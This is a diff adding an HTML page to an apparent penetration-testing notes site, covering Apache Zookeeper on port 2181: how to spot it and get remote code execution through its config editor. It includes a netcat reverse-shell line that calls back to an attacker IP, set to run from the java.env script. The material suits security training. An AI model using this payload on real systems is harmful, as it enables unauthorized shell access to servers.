@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/navBarStyles.css">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/walkthroughs.css">
+        <link href="/H4ckV4ult/styles/prism/prism.css" rel="stylesheet" />
+    <script src="/H4ckV4ult/styles/prism/prism.js"></script>
+    <title>Minimalist Webpage</title>
+
+</head>
+<body>
+    <div id="navbar-container"></div>
+    <script src="/H4ckV4ult/components/navbar.js"></script>
+
+    <div class="notion-container">
+        <div class="notion-header">
+            <h1>Apache Zookeeper (2181/TCP)</h1>
+            <p>Apache Zookeeper is a centralized service for maintaining configuration information, naming, providing distributed synchronization, and providing group services.</p>
+        </div>
+        <div class="notion-body">
+            <h2>Enumeration</h2>
+            <ul>
+                <p>In case you see that nessus outputs shows a <b>2181</b> port open you are likely dealing with an Apache Zookeeper instance.</p>
+                <p>In that case, the interface is normally located at port <b>8080</b></p>
+                <p>Once inside the interface we can check the version since it is displayed in the upper right corner.</p>
+            </ul>
+            <h2>Exploitation</h2>
+            <ul>
+                <p>Here you have the same process with images. <a class="notion-link" href="https://x7331.gitbook.io/boxes/services/tcp/2181-zookeeper">Here</a></p>
+                <p>In order to obtain RCE go to the <b>config</b>tab then <b>switch on the Editing mode</b></p>
+                <p>And place the following code into the section <b>java.env script</b></p>
+                <pre><code class="language-bash">$(/bin/nc -e /bin/sh 192.168.45.236 80 &)</code></pre>
+                <p>Then setup a listener and click in the <b>Commit</b> button to start the connection.</p>
+                
+            </ul>
+        </div>
+    </div>
+
+
+</body>
+</html>
